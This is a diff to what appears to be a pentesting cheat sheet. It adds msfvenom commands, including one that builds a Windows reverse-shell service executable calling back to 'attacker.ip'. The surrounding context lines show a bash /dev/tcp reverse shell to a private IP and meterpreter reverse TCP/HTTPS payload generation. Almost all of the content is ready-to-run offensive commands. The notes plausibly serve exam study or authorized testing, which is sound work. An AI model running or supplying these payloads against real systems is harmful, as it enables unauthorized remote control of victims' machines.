@@ -1158,6 +1158,10 @@ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
 
 # Msfvenom
 
+~~~ bash
+msfvenom --help-formats
+~~~
+
 ## list all payloads of msfvenom
 ~~~ bash
 msfvenom -l payloads --platform windows --arch x64
@@ -1191,6 +1195,11 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=attacker.ip LPORT=443 -f e
 ## ReverseShell(HTTPS)
 ~~~ bash
 msfvenom -p windows/x64/meterpreter_reverse_https LHOST=attacker.ip LPORT=443 -f exe -o met.exe
+~~~
+
+## Service binary
+~~~ bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker.ip LPORT=443 -f exe-service > shell.exe
 ~~~
 
 
